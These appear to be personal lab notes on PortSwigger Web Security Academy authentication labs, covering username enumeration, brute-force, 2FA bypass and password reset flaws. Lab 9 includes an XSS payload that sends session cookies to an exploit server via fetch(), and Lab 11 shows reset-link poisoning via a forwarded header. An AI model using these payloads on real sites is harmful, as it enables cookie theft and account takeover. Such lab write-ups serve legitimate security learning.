## Lab - 1: Username enumeration via different responses (A)

- test the login page and found that if username is incorrect, `incorrect username` will be shown.
- use Burp Intruder and find that correct username (`azureuser`)
- use with that user name and find the password with intruder

## Lab - 2: Username enumeration via subtly different responses (P)

- test the login page and found that if username is incorrect, `Invalid username or password.` will be shown
- use Burp Intruder and in `Options` > `Grep-Extract` > `Add`
- highlight `Invalid username or password.` phrase and click `OK`
- `Start Attack` and then sort with additional column and find that one user has response `Invalid username or password` with no fullstop (`academico`)
- then use that username and find the password with intruder

## Lab - 3: Username enumeration via response timing (P)

- This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

- Your credentials: wiener:peter

> not understand yet for this lab

## Lab - 4: Broken brute-force protection, IP block

- write with [python script](broken_bf_IP_block.py)

---

## Lab - 5: Username enumeration via account lock (P)

```
POST /login HTTP/1.1
...
username=§wiener§&password=peter§§
```

- attack type - cluster bomb
- payload for username - usernames.txt
- payload for password - Null payloads for 5 times

- sort the intruder results by length and found that username `alerts` has distinct length and response contains `You have made too many incorrect login attempts. Please try again in 1 minute(s)`

- then intrude only the password field with passwords.txt
- answer is the request that contains no error message (try with Grep-Extract)

---

## Lab - 6: 2FA simple bypass (A)

- This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page.

- Your credentials: wiener:peter
- Victim's credentials carlos:montoya

- enter with your account wiener:peter
- for code, enter the code from email and it redirect to `/my-account` page
- enter with carlos account and it will redirect to login2 page for second verification
- but manually change to `/my-account` page and carlos account is already log in

---

## Lab - 7: 2FA broken logic (P)

- This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.

- Your credentials: wiener:peter
- Victim's username: carlos
- You also have access to the email server to receive your 2FA verification code.

- login with your normal account wiener and there are 2 POST requests to login in
- for second login, change the cookie `verify` to `carlos` and brute-force the `mfa-code` from `0000 - 9999`

---

## Lab - 8: Brute-forcing a stay-logged-in cookie (P)

- This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing. To solve the lab, brute-force Carlos's cookie to gain access to his "My account" page.

- Your credentials: wiener:peter
- Victim's username: carlos

- log in with wiener with stay-logged in and found the cookie `stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw` which is based 64 and `wiener:51dc30ddc473d43a6011e9ebba6ca770`
- the later string after colon is md5 hash sum and after cracking it is `peter`
- try with `carlos:password` from password list with md5 hash password

- [python code](stay_login_cookie.py)

---

## Lab - 9: Offline password cracking (P)

- This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.

- Your credentials: wiener:peter
- Victim's username: carlos

- login with wiener
- comment box has XSS vulnerabilities
- at comment,

```html
<script>
  fetch("https://exploit-0a7f007d0468878ec08b8455015600f3.exploit-server.net/abc-"+document.cookie, {
    method: "POST",
    mode: "no-cors",
    body: document.cookie,
  });
```

- then at exploit server, access log
  `secret=dFhJB69K2i5b5aQIxcch2jAOxmP0idU5;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz` will get

- then crack the text and delete the account (pwd is needed for deleting account)

---

## Lab - 10: Password reset broken logic (A)

- This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page.

- Your credentials: wiener:peter
- Victim's username: carlos

- login with wiener and test the password reset functionality and found on POST request

```
POST /forgot-password?temp-forgot-password-token=X8tbTcrY2L7cBzKZFzTpMcMeRoUo4PdI HTTP/1.1
...

temp-forgot-password-token=X8tbTcrY2L7cBzKZFzTpMcMeRoUo4PdI&username=wiener&new-password-1=test&new-password-2=test
```

- this cause password reset
- then try next attempt to forgot password to get the token at the mail box and copy the token and change the username to carlos

```
temp-forgot-password-token=yv5w4KhNMRBecEd7yLkEBkusGhyXBngv&username=carlos&new-password-1=test&new-password-2=test
```

---

## Lab - 11: Password reset poisoning via middleware (P)

- This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server.

- login with wiener and test the password login feature
- for password reset, it will send a link to reset password via email like `https://0a2700aa04c5f11cc0c4491300ea002c.web-security-academy.net/forgot-password?temp-forgot-password-token=VlpmgDDQWXRzvIKgMTaErYv22uDSfT41`

- for this POST request, it is vulnerable to host header poisoning
- eg - if `X-Forwarded-For` header with value `example.com` is added, in email box, it will appear as `https://www.example.com/forgot-password?temp-forgot-password-token=VlpmgDDQWXRzvIKgMTaErYv22uDSfT41`

- then change

  - X-Forwarded-For to the exploit server
  - username to carlos

- if carlos follows the link in his mail box, it will appear in the exploit server access log as `/forgot-password?temp-forgot-password-token=VMc0ow21MdZFTZQRKwEjxhSDY61Qty12`

- then concatenate this parameter with original url like above URL and reset the password

---

## Lab - 12: Password brute-force via password change (P)

- This lab's password change functionality makes it vulnerable to brute-force attacks. To solve the lab, use the list of candidate passwords to brute-force Carlos's account and access his "My account" page. Your credentials: wiener:peter; Victim's username: carlos

- login with wiener and play with password change functionality
- if the current password is incorrect, `Current password is incorrect`
- if the current password is correct, but new and confirm new are incorrect, `New passwords do not match ` will show
- in POST request,

```
POST /my-account/change-password HTTP/1.1
...

username=carlos&current-password=§test§&new-password-1=testest&new-password-2=1234
```

- brute force with passwords and find the text `New passwords do not match`

---
